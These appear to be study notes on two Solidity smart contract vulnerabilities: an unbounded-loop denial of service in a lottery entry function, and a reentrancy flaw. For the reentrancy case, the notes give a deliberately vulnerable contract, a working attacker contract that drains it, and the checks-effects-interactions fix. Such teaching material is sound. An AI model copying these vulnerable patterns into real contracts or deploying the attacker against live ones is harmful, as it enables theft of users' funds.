### Denial of Service: 
  It check for duplicates value but as the main array is long it will cost more gas.
  So assume in a lottery, the entrant fee depends on the number of people in the lottery.
  Now a hacker can call the function a million time using different accounts so no other player can join the lottery. 
  
```solidity
      // SPDX-License-Identifier: MIT
      pragma solidity 0.8.20;
      
      contract DoS {
          address[] entrants;
      
          function enter() public {
              // Check for duplicate entrants
              for (uint256 i; i < entrants.length; i++) {
                  if (entrants[i] == msg.sender) {
                      revert("You've already entered!");
                  }
              }
              entrants.push(msg.sender);
          }
      }
```

### Rentrancy Attack;

Here attacker will use `ReentrancyAttacker::receive()` to call the `ReentrancyVictim::withdrawBalance()` and in middle the `ReentrancyAttacker::receive()` will be called again. It will result in attacker gaining the eth from victim balance. It will keep going until the victim balance is 0.
It can be solved by simply moving the state change before the `ReentrancyVictim::withdrawBalance()` function. This is also known as CEI(check, effects, interaction). 

```solidity
      // SPDX-License-Identifier: MIT
      pragma solidity 0.8.20;
      contract ReentrancyVictim {
          mapping(address => uint256) public userBalance;
      
          function deposit() public payable {
              userBalance[msg.sender] += msg.value;
          }
      
          function withdrawBalance() public {
              uint256 balance = userBalance[msg.sender];
              // An external call and then a state change!
              // External call
              (bool success,) = msg.sender.call{value: balance}("");
              if (!success) {
                  revert();
              }
      
              // State change
              userBalance[msg.sender] = 0;
          }
      }
      
      contract ReentrancyAttacker {
          ReentrancyVictim victim;
      
          constructor(ReentrancyVictim _victim) {
              victim = _victim;
          }
      
          function attack() public payable {
              victim.deposit{value: 1 ether}();
              victim.withdrawBalance();
          }
      
          receive() external payable {
              if (address(victim).balance >= 1 ether) {
                  victim.withdrawBalance();
              }
          }
      }
```
